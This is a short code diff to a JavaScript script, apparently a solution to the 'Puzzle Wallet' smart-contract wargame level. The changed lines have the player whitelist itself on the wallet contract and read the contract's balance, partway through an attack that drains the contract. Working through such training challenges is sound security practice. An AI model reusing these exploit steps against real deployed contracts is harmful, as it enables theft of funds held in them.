@@ -37,12 +37,11 @@ const attackPuzzleWallet = async () => {
     console.log(txReceipt1);
     // check below that player is now owner
     // TODO:
-    const ABI = [
-        "function approve(address spender, uint amount)",
-        "function swap(address from, address to, uint amount)",
-        "function balanceOf(address token, address account)",
-    ];
+    const ABI = ["function addToWhitelist(address addr) external "];
     const contractAttack = await ethers.getContractAt(ABI, puzzleWalletAddress);
+    const tx2 = await contractAttack.addToWhitelist(playerAddress);
+    // get balance of puzzle contract
+    const playerBalance = await provider.getBalance(puzzleWalletAddress);
 };
 
 attackPuzzleWallet()
